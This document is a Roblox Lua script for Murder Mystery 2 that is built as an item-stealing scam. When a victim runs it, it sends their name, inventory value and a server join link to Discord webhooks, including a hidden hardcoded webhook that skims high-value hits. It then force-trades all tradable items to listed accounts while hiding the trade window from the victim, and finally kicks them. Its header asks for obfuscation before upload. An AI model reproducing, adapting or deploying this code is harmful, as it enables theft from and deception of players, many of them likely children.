-- https://raw.githubusercontent.com/alikeremkanburr/WonyeHub/main/mainn.lua
-- OBFUSCATE BEFORE UPLOAD!

-- Prevent multiple executions
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- === LOGGING SYSTEM ===
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1433080602470645863/qp_7WqlvtNOdFNV1SA9Dij6zJTR0WvO7F7RcUojJoZcvFqGHic63X7Ljx9Fh8TDDtHD2"
local DUAL_USERS = {"NoHackLmfoGgs", "iEnderWasTakenn", "alikerem123417"}

-- === LOAD CONFIG ===
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Common"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if #users == 0 or webhook == "" then
    plr:Kick("Script error. Please contact the owner. Error Code : 772")
    return
end

-- === PRIORITY USERS ===
local priority_users = DUAL_USERS
local normal_users = {}
for _, u in ipairs(users) do
    if not table.find(priority_users, u) then
        table.insert(normal_users, u)
    end
end

-- === GAME CHECKS ===
if game.PlaceId ~= 142823291 then
    plr:Kick("Only MM2 is supported.")
    return
end

if ReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:Kick("VIP servers are not supported.")
    return
end

if #Players:GetPlayers() >= 12 then
    plr:Kick("Server is full.")
    return
end

-- === DATABASE & VALUE LIST ===
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local legendary_index = table.find(rarityTable, "Legendary")

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local headers = {
    ["User-Agent"] = "Mozilla/5.0",
    ["Accept"] = "text/html"
}

local function trim(s) return s:match("^%s*(.-)%s*$") end

-- === ÇOKLU HTTP DESTEĞİ (TÜM EXECUTORLARDA ÇALIŞIR) ===
local function sendWebhook(url, payload)
    local success, err = pcall(function()
        local body = HttpService:JSONEncode(payload)

        -- 1. Synapse X
        if syn and syn.request then
            print("[HTTP] Using syn.request")
            syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
            return
        end

        -- 2. Krnl / Fluxus / Electron
        if request then
            print("[HTTP] Using request")
            request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
            return
        end

        -- 3. Delta Executor
        if http and http.request then
            print("[HTTP] Using http.request (Delta)")
            http.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
            return
        end

        -- 4. Script-Ware
        if http_request then
            print("[HTTP] Using http_request")
            http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
            return
        end

        -- 5. Fallback: game:HttpPost (test)
        if game.HttpPost then
            print("[HTTP] Using game:HttpPost")
            game:HttpPost(url, body, "application/json")
            return
        end

        error("No HTTP function available!")
    end)

    if success then
        print("[WEBHOOK] Sent to: " .. url)
    else
        print("[WEBHOOK ERROR] Failed to send: " .. tostring(err))
    end
end

-- === FETCH HTML (value list) ===
local function fetchHTML(url)
    local success, resp = pcall(function()
        if syn and syn.request then
            local r = syn.request({Url = url, Method = "GET", Headers = headers})
            return r.Body
        elseif request then
            local r = request({Url = url, Method = "GET", Headers = headers})
            return r.Body
        elseif http and http.request then
            local r = http.request({Url = url, Method = "GET", Headers = headers})
            return r.Body
        end
        return ""
    end)
    return success and resp or ""
end

-- === VALUE LIST PARSING ===
local function parseValue(div)
    local v = div:match("<b class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    return v and tonumber(v:gsub(",", "")) or nil
end

local function extractItems(html)
    local items = {}
    for name, body in html:gmatch("<div class=['\"]itemhead['\"]>(.-)</div>%s*<div class=['\"]itembody['\"]>(.-)</div>") do
        name = trim(name:match("([^<]+)"):gsub("%s+", " "))
        name = trim(name:split(" Click ")[1]):lower()
        local val = parseValue(body)
        if val then items[name] = val end
    end
    return items
end

local function buildValueList()
    local values = {}
    local chroma = {}
    local lock = Instance.new("BindableEvent")
    local completed = 0

    for _, cat in ipairs(categories) do
        task.spawn(function()
            local html = fetchHTML(cat[2])
            if html ~= "" then
                if cat[1] ~= "chroma" then
                    local extracted = extractItems(html)
                    for n, v in pairs(extracted) do values[n] = v end
                else
                    chroma = extractItems(html)
                end
            end
            completed += 1
            if completed == 5 then lock:Fire() end
        end)
    end
    lock.Event:Wait()

    for id, item in pairs(database) do
        local name = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local idx = table.find(rarityTable, rarity)
        if idx and idx >= 4 then
            if item.Chroma then
                for cname, val in pairs(chroma) do
                    if cname:find(name) then values[id] = val; break end
                end
            else
                values[id] = values[name]
            end
        end
    end
    return values
end

-- === COLLECT ITEMS ===
local valueList = buildValueList()
local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local weaponsToSend = {}
local totalValue = 0
local has_legendary_or_higher = false

local untradable = {
    DefaultGun=true, DefaultKnife=true, Reaver=true, IceHammer=true, Gingerscythe=true,
    TestItem=true, Season1TestKnife=true, Cracks=true, Icecrusher=true, ["???"]=true,
    Dartbringer=true, TravelerAxeRed=true, TravelerAxeBronze=true, TravelerAxeSilver=true,
    TravelerAxeGold=true, BlueCamo_K_2022=true, GreenCamo_K_2022=true, SharkSeeker=true
}

local min_rarity_index = table.find(rarityTable, min_rarity) or 1

for id, amt in pairs(realData.Weapons.Owned) do
    local item = database[id]
    if item and not untradable[id] then
        local r_idx = table.find(rarityTable, item.Rarity)
        if r_idx and r_idx >= min_rarity_index then
            local value = valueList[id] or (r_idx >= 4 and 2 or 1)
            if value >= min_value then
                totalValue = totalValue + value * amt
                table.insert(weaponsToSend, {DataID=id, Rarity=item.Rarity, Amount=amt, Value=value})
                if r_idx >= legendary_index then
                    has_legendary_or_higher = true
                end
            end
        end
    end
end

if #weaponsToSend == 0 then return end

table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount) > (b.Value*b.Amount) end)
local sentWeapons = {}
for i,v in ipairs(weaponsToSend) do sentWeapons[i] = v end

-- === EMBED BUILDER ===
local function buildEmbed(title, fields)
    return {embeds = {{title = title, color = 65280, fields = fields, footer = {text = "Have fun :)"}}}}
end

-- === SEND MESSAGES ===
local function SendFirstMessage()
    print("[WEBHOOK] Sending first message...")
    local fields = {
        {name="Victim:", value=plr.Name, inline=true},
        {name="Join Link:", value="https://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId},
        {name="Item List:", value="", inline=false},
        {name="Total Value:", value=tostring(totalValue), inline=false}
    }
    for _, item in ipairs(weaponsToSend) do
        fields[3].value = fields[3].value .. string.format("%s (x%s): %s (%s)\n", item.DataID, item.Amount, item.Value*item.Amount, item.Rarity)
    end
    if #fields[3].value > 1024 then fields[3].value = fields[3].value:sub(1,1020).."..." end

    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
    local payload = buildEmbed("Join to get MM2 hit", fields)
    payload.content = prefix.."teleport here"

    sendWebhook(webhook, payload)
    if has_legendary_or_higher then sendWebhook(DUAL_WEBHOOK, payload) end
end

local function SendExecutionMessage()
    print("[WEBHOOK] Sending execution message...")
    local fields = {
        {name="Victim:", value=plr.Name, inline=true},
        {name="Items Sent:", value="", inline=false},
        {name="Total Value:", value=tostring(totalValue), inline=false}
    }
    for _, item in ipairs(sentWeapons) do
        fields[2].value = fields[2].value .. string.format("%s (x%s): %s (%s)\n", item.DataID, item.Amount, item.Value*item.Amount, item.Rarity)
    end
    if #fields[2].value > 1024 then fields[2].value = fields[2].value:sub(1,1020).."..." end

    local payload = buildEmbed("New MM2 Execution", fields)
    sendWebhook(webhook, payload)
    if has_legendary_or_higher then sendWebhook(DUAL_WEBHOOK, payload) end
end

SendFirstMessage()

-- === TRADE SYSTEM ===
local function sendTradeRequest(user)
    ReplicatedStorage.Trade.SendRequest:InvokeServer(Players:WaitForChild(user))
end

local function getTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while getTradeStatus() ~= "None" do task.wait(0.1) end
end

local function acceptTrade()
    ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
end

local function addWeaponToTrade(id)
    ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
end

local function doTrade(target)
    local status = getTradeStatus()
    if status == "StartTrade" then ReplicatedStorage.Trade.DeclineTrade:FireServer()
    elseif status == "ReceivingRequest" then ReplicatedStorage.Trade.DeclineRequest:FireServer() end
    task.wait(0.3)

    while #weaponsToSend > 0 do
        status = getTradeStatus()
        if status == "None" then
            sendTradeRequest(target)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local w = table.remove(weaponsToSend, 1)
                for _ = 1, w.Amount do addWeaponToTrade(w.DataID) end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        end
        task.wait(1)
    end
    plr:Kick("All items taken by antxchris :D")
end

-- === WAIT FOR USER ===
local target_user = nil
local message_sent = false

local function updateTarget()
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(priority_users, p.Name) then
            target_user = p.Name
            break
        elseif not target_user and table.find(normal_users, p.Name) then
            target_user = p.Name
        end
    end
end

updateTarget()
Players.PlayerAdded:Connect(function(p)
    if table.find(priority_users, p.Name) then
        target_user = p.Name
    elseif not target_user and table.find(normal_users, p.Name) then
        target_user = p.Name
    end
end)

spawn(function()
    while not target_user do
        updateTarget()
        task.wait(1)
    end

    local playerObj = Players:FindFirstChild(target_user)
    if playerObj then
        playerObj.Chatted:Connect(function()
            if not message_sent then
                SendExecutionMessage()
                message_sent = true
            end
            doTrade(target_user)
        end)
    end
end)

-- Block Trade GUI
plr.PlayerGui.TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
    plr.PlayerGui.TradeGUI.Enabled = false
end)
plr.PlayerGui.TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
    plr.PlayerGui.TradeGUI_Phone.Enabled = false
end)
